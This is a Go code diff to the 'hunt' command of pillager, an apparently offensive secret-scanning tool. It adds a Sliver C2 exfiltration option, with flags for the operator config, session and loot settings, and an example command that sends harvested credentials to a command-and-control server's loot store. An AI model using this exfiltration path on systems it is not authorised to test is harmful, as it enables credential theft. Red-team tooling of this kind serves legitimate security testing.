@@ -8,10 +8,12 @@ import (
 	"fmt"
 	"os"
 	"runtime"
+	"strings"
 
 	"github.com/brittonhayes/pillager"
 	"github.com/brittonhayes/pillager/pkg/exfil"
-	_ "github.com/brittonhayes/pillager/pkg/exfil/s3"       // Register S3 exfiltrator
+	_ "github.com/brittonhayes/pillager/pkg/exfil/s3"      // Register S3 exfiltrator
+	_ "github.com/brittonhayes/pillager/pkg/exfil/sliver"  // Register Sliver exfiltrator
 	_ "github.com/brittonhayes/pillager/pkg/exfil/webhook" // Register webhook exfiltrator
 	"github.com/brittonhayes/pillager/pkg/scanner"
 	"github.com/brittonhayes/pillager/pkg/tui/model"
@@ -31,17 +33,24 @@ var (
 	workers     int
 
 	// Exfiltration flags
-	exfilType      string
-	exfilCompress  bool
-	exfilEncrypt   string
-	s3Bucket       string
-	s3Region       string
-	s3Endpoint     string
-	s3Prefix       string
-	s3AccessKey    string
-	s3SecretKey    string
-	webhookURL     string
-	webhookHeader  []string
+	exfilType     string
+	exfilCompress bool
+	exfilEncrypt  string
+	s3Bucket      string
+	s3Region      string
+	s3Endpoint    string
+	s3Prefix      string
+	s3AccessKey   string
+	s3SecretKey   string
+	webhookURL    string
+	webhookHeader []string
+
+	// Sliver C2 flags
+	sliverConfig     string
+	sliverSession    string
+	sliverLootName   string
+	sliverLootType   string
+	sliverParseCreds bool
 )
 
 // huntCmd represents the hunt command.
@@ -64,6 +73,9 @@ var huntCmd = &cobra.Command{
 
 	Custom Go Template Format:
 		pillager hunt . --template "{{ range .}}Secret: {{.Secret}}{{end}}"
+
+	Exfiltrate to Sliver C2:
+		pillager hunt . --exfil sliver --sliver-config ~/.sliver-client/configs/operator.cfg --sliver-session <session-id>
 `,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		opts, err := setupConfig()
@@ -125,27 +137,43 @@ func exfiltrateFindings(findings []pillager.Finding) error {
 		Type:          exfilType,
 		EncryptionKey: exfilEncrypt,
 		Compress:      exfilCompress,
-		Options:       make(map[string]string),
 	}
 
 	// Add type-specific options
 	switch exfilType {
 	case "s3":
-		cfg.Options["bucket"] = s3Bucket
-		cfg.Options["region"] = s3Region
-		cfg.Options["endpoint"] = s3Endpoint
-		cfg.Options["prefix"] = s3Prefix
-		cfg.Options["access_key"] = s3AccessKey
-		cfg.Options["secret_key"] = s3SecretKey
+		cfg.S3 = &exfil.S3Options{
+			Bucket:    s3Bucket,
+			Region:    &s3Region,
+			Endpoint:  &s3Endpoint,
+			Prefix:    &s3Prefix,
+			AccessKey: &s3AccessKey,
+			SecretKey: &s3SecretKey,
+		}
+
 	case "webhook":
-		cfg.Options["url"] = webhookURL
-		// Parse headers
+		headers := make(map[string]string)
 		for _, header := range webhookHeader {
 			parts := splitHeader(header)
 			if len(parts) == 2 {
-				cfg.Options[parts[0]] = parts[1]
+				headers[parts[0]] = parts[1]
 			}
 		}
+
+		cfg.Webhook = &exfil.WebhookOptions{
+			URL:     webhookURL,
+			Headers: headers,
+		}
+
+	case "sliver":
+		cfg.Sliver = &exfil.SliverOptions{
+			ConfigPath:       sliverConfig,
+			SessionID:        &sliverSession,
+			LootName:         &sliverLootName,
+			LootType:         &sliverLootType,
+			ParseCredentials: &sliverParseCreds,
+		}
+
 	default:
 		return fmt.Errorf("unsupported exfil type: %s", exfilType)
 	}
@@ -165,7 +193,7 @@ func exfiltrateFindings(findings []pillager.Finding) error {
 func splitHeader(header string) []string {
 	for i, c := range header {
 		if c == ':' {
-			return []string{header[:i], header[i+1:]}
+			return []string{strings.TrimSpace(header[:i]), strings.TrimSpace(header[i+1:])}
 		}
 	}
 	return []string{header}
@@ -183,7 +211,7 @@ func init() {
 	huntCmd.Flags().IntVarP(&workers, "workers", "w", runtime.NumCPU(), "number of concurrent workers")
 
 	// Exfiltration flags
-	huntCmd.Flags().StringVar(&exfilType, "exfil", "", "exfiltration type (s3, webhook)")
+	huntCmd.Flags().StringVar(&exfilType, "exfil", "", "exfiltration type (s3, webhook, sliver)")
 	huntCmd.Flags().BoolVar(&exfilCompress, "exfil-compress", false, "compress findings before exfiltration")
 	huntCmd.Flags().StringVar(&exfilEncrypt, "exfil-encrypt", "", "encryption key (env:VAR, file:/path, or base64)")
 
@@ -198,6 +226,13 @@ func init() {
 	// Webhook flags
 	huntCmd.Flags().StringVar(&webhookURL, "webhook-url", "", "webhook URL for HTTP POST")
 	huntCmd.Flags().StringSliceVar(&webhookHeader, "webhook-header", []string{}, "webhook headers (format: 'Key:Value')")
+
+	// Sliver C2 flags
+	huntCmd.Flags().StringVar(&sliverConfig, "sliver-config", "", "path to Sliver operator config file (e.g., ~/.sliver-client/configs/operator.cfg)")
+	huntCmd.Flags().StringVar(&sliverSession, "sliver-session", "", "Sliver session/beacon ID to associate findings with")
+	huntCmd.Flags().StringVar(&sliverLootName, "sliver-loot-name", "pillager-scan", "prefix for loot item names in Sliver")
+	huntCmd.Flags().StringVar(&sliverLootType, "sliver-loot-type", "credentials", "type of loot to store in Sliver")
+	huntCmd.Flags().BoolVar(&sliverParseCreds, "sliver-parse-creds", true, "parse and store credentials in Sliver's credential store")
 
 	// Bind flags to viper
 	viper.BindPFlag("dedupe", huntCmd.Flags().Lookup("dedupe"))
